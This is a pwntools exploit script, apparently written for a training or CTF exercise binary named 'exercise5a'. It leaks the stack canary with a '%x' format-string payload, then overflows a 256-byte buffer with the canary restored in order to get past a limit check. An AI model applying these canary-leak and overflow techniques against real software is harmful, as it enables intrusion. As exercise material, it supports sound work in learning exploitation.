#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import binascii

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

e = ELF(exe)
ret_addr = e.symbols['uncallable'].to_bytes(8, byteorder='little')

r = start()

# Leak the canary
init_msg = 42 * b'%x'
out = r.recv()
r.sendline(init_msg)
out = r.recv()
canary = out[-66:-58]
canary = binascii.unhexlify(canary)[::-1]

# Use the canary to overwrite the branch check and output value
limit = b'\xff' * 3 + b'\xf0'
fin_msg = b'a' * 256 + canary + b'A' * 8 + limit #+ b'\x00' * 3 #+ ret_addr
r.send(fin_msg)
r.send(b'\n')
out = r.recv()
print(out)

